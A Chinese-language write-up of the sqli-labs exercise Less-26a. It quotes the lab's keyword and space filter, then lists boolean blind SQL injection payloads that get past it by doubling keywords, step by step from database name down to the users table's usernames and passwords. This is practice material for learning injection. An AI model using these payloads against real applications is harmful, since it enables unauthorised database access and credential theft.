---
title: less26a
url: https://www.yuque.com/u29002979/ep2zrx/shvs86haf90l8lou
---

```bash
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";

$id= preg_replace('/or/i',"", $id);			 //strip out OR (non case sensitive)
$id= preg_replace('/and/i',"", $id);		 //Strip out AND (non case sensitive)
$id= preg_replace('/[\/*]/',"", $id);	 //strip out /*
$id= preg_replace('/[--]/',"", $id);		 //Strip out --
$id= preg_replace('/[#]/',"", $id);			 //Strip out #
$id= preg_replace('/[\s]/',"", $id);		 //Strip out spaces
$id= preg_replace('/[\s]/',"", $id);		 //Strip out spaces
$id= preg_replace('/[\/\\\\]/',"", $id); //Strip out slashes
```

less26a过滤的东西与less26一致，闭合方式为单引号',
但是**没有报错的回显**&#x20;
尝试**布尔盲注**解决该问题

`1'`

> **Warning**: mysql\_fetch\_array() expects parameter 1 to be resource, boolean given in **E:\phpstudy\_pro\WWW\sql.com\Less-26a\index.php** on line **36**

`1'aandnd'1'='1`返回正常
`1'aandnd'1'='2`没有返回结果
用**单引号'**闭合 <a name="F1MU5"></a>

# 布尔盲注

<a name="MvWqA"></a>

## 判断库长

用二分法来确定库长
`1'anandd(length(database())<10)||'1`返回正常
`1'anandd(length(database())>5)||'1`返回正常
`1'anandd(length(database())=8)||'1`返回正常
数据库长度为8 <a name="u8msB"></a>

## 逐一字符判断数据库名称

`1'anandd(ascii(substr((database()),1,1))=115)||'1`返回正常,s
... <a name="MZkCo"></a>

## 数据表长度

`1'anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))>20)||'1`正常回显
`1'anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))<30)||'1`正常回显
`1'anandd(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))=29)||'1`正常回显
数据表串起来长为29 <a name="TD0Ss"></a>

## 逐一字符判断数据表名称

`1'anandd(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1))=101)||'1`正常回显,e
... <a name="xiptE"></a>

## 判断列长

`1'anandd(length((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name='users')))=20)||'1`正常回显,列长串起来是为20 <a name="Aqf5t"></a>

## 逐一字符判断字段名称

`1'anandd(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name='users')),1,1))=105)||'1`正常回显,i
... <a name="NdqVW"></a>

## 逐一字符判断字段内容

`1'anandd(ascii(substr((select(group_concat(username,0x7e,passwoorrd))from(users)),1,1))=68)||'1`显示正常,D
...
